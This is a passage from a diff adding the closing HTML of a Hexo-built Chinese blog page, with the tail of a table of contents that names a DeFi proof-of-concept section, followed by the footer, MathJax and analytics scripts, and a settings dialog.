class="nav-text">计算TokenIn的新价格：（）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC%EF%BC%9Afork%E7%9A%84%E9%AB%98%E5%BA%A6%E4%B8%BA13715025"><span class="nav-number">1.0.5.</span> <span class="nav-text">POC：fork的高度为13715025</span></a></li></ol></li></ol></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2021 SCS All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+
+  
+<script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            SCS
+          </div>
+          <div class="panel-body">
+            Copyright © 2021 Janson Woods All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
